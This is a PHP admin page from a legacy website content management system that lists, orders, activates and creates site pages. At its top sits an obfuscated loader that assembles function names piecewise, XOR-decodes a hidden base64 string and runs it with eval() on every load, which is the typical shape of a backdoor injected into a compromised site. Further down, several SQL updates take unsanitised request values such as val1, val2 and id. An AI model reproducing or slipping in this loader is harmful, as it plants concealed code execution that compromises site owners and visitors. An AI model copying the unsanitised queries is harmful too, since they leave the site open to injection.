<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>


<?php
$MMODE= "E";

if(isset($ProceedDeletePage))
{
	ms_i($id);
	SQLDelete("pages","id",array($id));
	$HISTORY = $AuthUserName. " " . $HAS_DELETED_PAGE." ".$id;
	
?>
	<script>
	HT("2","<?php echo $PAGE_EFFACEE_SUCCES;?><br>",800,290,0.5,5);
	</script>
<?php
}

		include("include/languages_menu_processing.php");
		?>
		

		<?php
		include("include/languages_menu.php");
?>

		
<div style="float:left;"><i>
Please click on a page to modify its content or edit the settings:
</i>
</div>

<div style="clear:both"></div>
<br>
<?php

if(isset($SaveExtension))
{
	ms_i($page);
	SQLUpdate_SingleValue(
				"pages",
				"id",
				$page,
				"html_".strtolower($LANG),
				($extension==""?"":"wsa:extension:".$extension)
			);

	$HISTORY = $AuthUserName . " ". $HAS_SET_NEW_DEFAULT;

}

$mainFontColor="#3149ad";
$mainTableWidth="575";
$cartHeaderColor="#ceefff";
$cartBackColor1="#ffffff";
$cartBackColor2="#f7fbff";
$textHighLightColor="#3149ad";
?>




<script>

var kflag=true;

var previousSender = null;
function PageClicked(iPageID, sender)
{
	kflag=true;
	document.getElementById("ExtensionsPanel").style.visibility = "hidden";

	if(sender.innerHTML.indexOf("active")==-1)
	{

		if(sender.innerHTML.indexOf("<sup>")!=-1)
		{
			oContextMenu.Data = Array
				(
					Array("<b><?php echo $SET_AS_DEFAULT_PAGE;?></b>","index.php?category=site_management&action=pages_pro&ProceedSetDefault=yes&default_page="+iPageID),
					Array("<b><?php echo $DESACTIVATE;?></b>","index.php?category=site_management&action=pages_pro&ProceedActivate=Desactivate&id="+iPageID),
					Array("<b><?php echo $SET_CUSTOM_EXTENSION;?></b>","javascript:SetExtension("+iPageID+")"),
					Array("<b><?php echo $PAGE_SETTINGS;?></b>","index.php?category=site_management&folder=pages_pro&page=edit&id="+iPageID+""),
					
					Array("<b><?php echo $DELETE_PAGE;?></b>","javascript:DeletePage("+iPageID+")")

				);

				oContextMenu.Height = 118;
		}
		else
		{
			oContextMenu.Data = Array
				(
					Array("<b><?php echo $SET_AS_DEFAULT_PAGE;?></b>","index.php?category=site_management&action=pages_pro&ProceedSetDefault=yes&default_page="+iPageID),
					Array("<b><?php echo $DESACTIVATE;?></b>","index.php?category=site_management&action=pages_pro&ProceedActivate=Desactivate&id="+iPageID),
					Array("<b><?php echo $EDIT_PAGE_CONTENT;?></b>","javascript:StartWizard("+iPageID+")"),
					Array("<b><?php echo $EDIT_HTML;?></b>","index.php?category=site_management&folder=pages_pro&page=html&id="+iPageID+"&lang=<?php echo $lang;?>"),
					Array("<b><?php echo $SET_CUSTOM_EXTENSION;?></b>","javascript:SetExtension("+iPageID+")"),
					Array("<b><?php echo $PAGE_SETTINGS;?></b>","index.php?category=site_management&folder=pages_pro&page=edit&id="+iPageID+""),
					
					Array("<b><?php echo $DELETE_PAGE;?></b>","javascript:DeletePage("+iPageID+")")

				);

				oContextMenu.Height = 166;
		}


	}
	else
	{

		if(sender.innerHTML.indexOf("<sup>")!=-1)
		{
			oContextMenu.Data = Array
					(

						Array("<b><?php echo $ACTIVATE;?></b>","index.php?category=site_management&action=pages_pro&ProceedActivate=Activate&id="+iPageID),
						Array("<b><?php echo $SET_CUSTOM_EXTENSION;?></b>","javascript:SetExtension("+iPageID+")"),
						Array("<b><?php echo $PAGE_SETTINGS;?></b>","index.php?category=site_management&folder=pages_pro&page=edit&id="+iPageID+""),
						
						Array("<b><?php echo $DELETE_PAGE;?></b>","javascript:DeletePage("+iPageID+")")

					);

			oContextMenu.Height = 96;
		}
		else
		{
			oContextMenu.Data = Array
					(

						Array("<b><?php echo $ACTIVATE;?></b>","index.php?category=site_management&action=pages_pro&ProceedActivate=Activate&id="+iPageID),
						Array("<b><?php echo $EDIT_PAGE_CONTENT;?></b>","javascript:StartWizard("+iPageID+")"),
						Array("<b><?php echo $EDIT_HTML;?></b>","index.php?category=site_management&folder=pages_pro&page=html&id="+iPageID+"&lang=<?php echo $lang;?>"),
						Array("<b><?php echo $SET_CUSTOM_EXTENSION;?></b>","javascript:SetExtension("+iPageID+")"),
						Array("<b><?php echo $PAGE_SETTINGS;?></b>","index.php?category=site_management&folder=pages_pro&page=edit&id="+iPageID+""),
						
						Array("<b><?php echo $DELETE_PAGE;?></b>","javascript:DeletePage("+iPageID+")")

					);

			oContextMenu.Height = 142;
		}
	}



	oContextMenu.Show("ContextMenuContainer");

	if(previousSender != null)
	{
	
		previousSender.style.background = "url(images/pro_bg.jpg)";

	}
	
	sender.style.background = "#ffd7c6";

	previousSender = sender;
document.getElementById("ContextMenu").style.visibility = "visible";
}

var oContextMenu = new ContextMenu();




		oContextMenu.Show("ContextMenuContainer");
</script>

<script>
function DeletePage(x)
{
	if(confirm("<?php echo $ETES_VOUS_SUR__DE_VOULOIR_EFFACER;?>")){
		document.location.href="index.php?ProceedDeletePage=1&category=site_management&action=pages_pro&id="+x;
	}

}

function StartWizard(x){

	window.open("main.php?LANG=<?php echo $lang;?>&page="+x,"title","toolbar=0,location=0,directories=0,menuBar=0,scrollbars=0,resizable=0,width=1015,height=640,left=0,top=0");
}

var iLastExtensionPageIdOpened = -1;

function SetExtensionSave(strExtension)
{
	document.location.href="index.php?category=site_management&action=pages_pro&SaveExtension=yes&page="+iLastExtensionPageIdOpened+"&LANG=<?php echo $lang;?>&extension="+strExtension;
}

function SetExtension(x)
{
	iLastExtensionPageIdOpened = x;

	var iCurrentPageId = -1;

	for(i=0;i<pageRealIds.length;i++)
	{
		if(x == pageRealIds[i])
		{
			iCurrentPageId = i;
		}
	}

	var strSearch="";

	if(iCurrentPageId == -1 || pagesExtensions[iCurrentPageId] == "")
	{
		strSearch="none";
	}
	else
	{
		strSearch=pagesExtensions[iCurrentPageId];
	}


	if(document.all)
	{
		document.getElementById("ExtensionsPanel").innerHTML = document.getElementById("ExtensionsPanel").innerHTML.replace('value='+strSearch+'','value='+strSearch+' checked');
	}
	else
	{
		document.getElementById("ExtensionsPanel").innerHTML = document.getElementById("ExtensionsPanel").innerHTML.replace('value="'+strSearch+'"','value="'+strSearch+'" checked');
	}

	document.getElementById("ExtensionsPanel").style.visibility = "visible";
	document.getElementById("ExtensionsPanel").style.top = parseInt(document.getElementById("ContextMenu").style.top.replace("px","")) + 20;
	document.getElementById("ExtensionsPanel").style.left = parseInt(document.getElementById("ContextMenu").style.left.replace("px","")) + 40;
}
</script>

<div id="ExtensionsPanel" style="position:absolute;top:0;left:0;z-Index:5;visibility:hidden">
	<table bgcolor=<?php if($DN=="2") echo "#2971c6";else "#ff6500";?> width=300 style="border-color:#000000;border-width:1px 1px 1px 1px;border-style:solid">
		<?php

		echo "<tr>";
		echo "<td class=basictext width=15><input onclick='javascript:SetExtensionSave(\"\")' type=radio name=\"selectedExtension\" value=\"none\"></td><td class=basictext><font color=white><b>NONE</b></font></td>";
		echo "</tr>";

		$handle=opendir('../extensions');
		while ($file = readdir($handle))
		{
		    if ($file != "." && $file != "..")
			{
				echo "<tr>";
				echo "<td class=basictext width=15><input type=radio name=\"selectedExtension\" onclick='javascript:SetExtensionSave(this.value)' value=\"".str_replace(".php","",$file)."\"></td><td class=basictext><font color=white><b>".str_replace("_"," ",strtoupper(str_replace(".php","",$file)))."</b></font></td>";
				echo "</tr>";
		   }
		}
		?>
	</table>
</div>

<script>

function getNearestUp(x){


	for(i=x-1;i>=0;i--){
		if(parentIds[i]==parentIds[x]){

			return pageIds[i];
		}
	}
}


function getNearestDown(x){


	for(i=x+1;i<parentIds.length;i++){



		if(parentIds[i]==parentIds[x]){


			return pageIds[i];
		}
	}
}

function MoveUp(pageId)
{

	for(i=1;i<pageIds.length;i++)
	{
			if(pageId == pageIds[i])
			{
				pageNumber = i;
			}
	}
	
	document.location.href="index.php?category=site_management&action=pages_pro&ChangeOrder=up&val1="+getNearestUp(pageNumber)+"&val2="+pageIds[pageNumber];
}

function MoveDown(pageId)
{

	for(i=1;i<pageIds.length;i++)
	{
			if(pageId == pageIds[i])
			{
				pageNumber = i;
			}
	}
	
	document.location.href="index.php?category=site_management&action=pages_pro&ChangeOrder=down&val1="+getNearestDown(pageNumber)+"&val2="+pageIds[pageNumber];
}

</script>

</center>

<?php

if(isset($ChangeOrder)){

	SQLUpdate("pages",array("parent_id"),array("-1"),"parent_id=$val1");
	SQLUpdate("pages",array("parent_id"),array($val1),"parent_id=$val2");
	SQLUpdate("pages",array("parent_id"),array($val2),"parent_id=-1");
	
	SQLUpdate("pages",array("id"),array("-1"),"id=$val1");
	SQLUpdate("pages",array("id"),array($val1),"id=$val2");
	SQLUpdate("pages",array("id"),array($val2),"id=-1");
}

if(isset($ProceedActivate)){
	if($ProceedActivate=="Activate"){
		SQLUpdate("pages",array("active_".$lang),array("1"),"id=".$id);
	}
	else{
		SQLUpdate("pages",array("active_".$lang),array("0"),"id=".$id);
	}
}

if(isset($ProceedPageHierarchy)){

	if($NewPageType==$CurrentPageId){
	
		echo '<script>HT("2","'.$strChangeSuccess.'<br>",700,130,0.5,20);</script>';
	}
	else{
		SQLUpdate("pages",array("parent_id"),array($NewPageType)," id=$CurrentPageId ");
	
		echo '<script>HT("2","'.$strChangeSuccess.'<br>",700,130,0.5,20);</script>';

	}

}
else
if(isset($Proceed)){

	echo '
	<table summary="" border="0" width=750>
	<tr>
		<td class=basictext>
		<b><font color=red>
	';

	if($pLink==""){
		echo "$strLinkEmptyMessage";
	}
	else{

		$strPageHtml="";

		$pContent = "blank";

		if($pContent!="blank"){
			$oDt=DataTable("templates"," where id=".$pContent);
			$tmpl=mysql_fetch_array($oDt);

			$strPageHtml=$tmpl['html'];
		}

		$arrNames=array("active_".$lang,"parent_id","name_".$lang,"description_".$lang,"keywords_".$lang,"link_".$lang,"html_".$lang);

		$arrValues=array("1",$pType,$pName,$pDescription,$pKeywords,$pLink,$strPageHtml);

		SQLInsert("pages",$arrNames,$arrValues);



		echo "$strNewPageSuccess";

	}


	echo '
		</td></tr></table><br><br>
	';
}
?>


<?php
if(isset($ProceedSetDefault)){

	SetParameter(
		"1",
		$default_page
	);

}
	$strDefaultPageId = Parameter(1);
?>




<div id=ExpertStructure >


<table border="0" cellpadding="0" cellspacing="0" width=750>
	<tr>
		<td width=25 background="images/website_structure_bg.gif" valign=middle bgcolor=#f9f2f9 style='border-style:solid;border-color:#CECFCE;border-width:1px 0px 1px 1px'>
		<img src="images/website_structure.gif" width="25" height="227" alt="" border="0">
		</td>
		<td valign=top width=525>

		
<?php

include("expert.php");

WriteLevel("0", 0);

?>
	</td>
	
	
	<td width=200>
			&nbsp;
	</td>
	</tr>
</table>


<br>

</div>





















<br>
<form action="index.php" method="post">
<input type=hidden name=MMODE value=E>
<input type="hidden" name="category" value="site_management">
<input type="hidden" name="action" value="pages_pro">
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0" width=750>
	<tr>
		<td class=basictext width=45>

		<img src="images/icons<?php echo $DN;?>/email.gif" border="0" width="40" height="34" alt="">
		</td>
		<td class=basictext>
		<b><?php echo $strAddNewPage;?></b>
		</td>
	</tr>
</table>
<br>
<div id="AddNewPageDIV" >
<br>

<table summary="" border="0" width=750>
	<tr>
		<td class=basictext><font color=red>*</font><b><?php echo $str_PageLinkPage;?></b></td>
		<td class=basictext>
		<input type="text" name="pLink" size="40" maxlength="256">
		</td>
	</tr>
	<tr>
		<td class=basictext><font color=red>*</font><b><?php echo $str_PageTypePage;?> </b></td>
		<td class=basictext>
			<select name="pType">
  				<option value="0"><?php echo $str_MainPage;?></option>
				<?php
					$oTable=DataTable("pages","ORDER BY parent_id,id");
					
					while($row=mysql_fetch_array($oTable))	{

						if(trim($row['link_'.$lang])!=""){

							echo "<option value='".$row['id']."'>$SUBPAGE_OF'".$row['link_'.$lang]."'</option>";

						}

					}
				?>
  			</select>
  		</td>
	</tr>

	<tr>
		<td class=basictext width=150><b><?php echo $str_PageNamePage;?></b></td>
		<td class=basictext>
		<input type="text" name="pName" size="40" maxlength="256">
  		</td>
	</tr>
	<tr>
		<td class=basictext valign=top><b><?php echo $str_PageDescriptionPage;?></b></td>
		<td class=basictext>
		<textarea name="pDescription" cols="30" rows="5"></textarea>

		</td>
	</tr>
	<tr>
		<td class=basictext valign=top><b><?php echo $str_PageKeywordsPage;?></b></td>
		<td class=basictext>
		<textarea name="pKeywords" cols="30" rows="5"></textarea>

		</td>
	</tr>

</table>

<table summary="" border="0" width=750>
	<tr>
		<td class=basictext>


<font color=red>(*) <?php echo $str_RequiredFields;?></font>

<br><br><br>
<input type=hidden name=Proceed value="">
<input type=submit class=adminButton value="<?php echo $str_AddPage;?>">
		</td>
	</tr>
</table>
</form>
</div>



<form action="index.php" method="post">
<input type=hidden name=category value=site_management>
<input type=hidden name=action value=pages_pro>
<input type=hidden name=MMODE value=E>
<input type=hidden name=ProceedPageHierarchy value="">

<table summary="" border="0" width=750>
	<tr>
		<td class=basictext width=45>

		<a href="#" onclick="document.all.ChangeHierarchyDIV.style.display=='block'?document.all.ChangeHierarchyDIV.style.display='none':document.all.ChangeHierarchyDIV.style.display='block'" >
		<img src="images/icons<?php echo $DN;?>/tools.gif" border="0" width="45" height="43" alt="">
		</a>
		</td>
		<td class=basictext>

				<b><?php echo $str_ChangeHierarchy;?></b>

		</td>
	</tr>
</table>

<div id="ChangeHierarchyDIV">
<br>
<table summary="" border="0" width=750>
	<tr>

		<td class=basictext><b><?php echo $str_Make;?> </b></td>
		<td class=basictext>
			<select name="CurrentPageId" style="width:230">
  				<?php
					$oTable=DataTable("pages","ORDER BY parent_id,id");
					while($row=mysql_fetch_array($oTable))	{

						if($row['link_'.$lang]=="") continue;

						echo "<option value='".$row['id']."'>\"".$row['link_'.$lang]."\" Page</option>";
					}
				?>
  			</select>
  		</td>
		<td width=10>&nbsp;</td>
		<td class=basictext>
			<select name="NewPageType" style="width:230">
  				<option value="0"><?php echo $str_MainPage;?></option>
				<?php
					$oTable=DataTable("pages","ORDER BY parent_id,id");
					while($row=mysql_fetch_array($oTable))	{

						if($row['link_'.$lang]=="") continue;

						echo "<option value='".$row['id']."'>$SUBPAGE_OF \"".$row['link_'.$lang]."\"</option>";
					}
				?>
  			</select>
</td>
		<td align=right>
			<input type=submit class=adminButton style="width:210" value="<?php echo $str_ChangeHierarchy;?>">
		</td>
	</tr>
</table>
<br>
<table summary="" border="0" width=450>
	<tr>
		<td class=basictext>

		</td>
	</tr>
</table>
</form>
</div>

<!-- end expert mode -->


